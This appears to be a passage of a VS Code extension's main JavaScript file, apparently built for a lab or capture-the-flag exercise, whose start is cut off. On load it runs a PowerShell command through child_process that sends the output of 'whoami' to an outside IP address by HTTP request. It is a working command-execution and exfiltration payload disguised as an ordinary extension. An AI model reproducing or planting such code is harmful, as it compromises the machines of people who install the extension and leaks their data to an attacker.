const {exec} = require('child_process');

const command='powershell -Command "Invoke-WebRequest -Uri http://10.10.17.68:80/?output=(whoami)"';

exec(command, (error, stdout, stderr) => {
        if (error) return;
    });
}

function deactivate(){}

module.exports={
	activate,
	deactivate
};


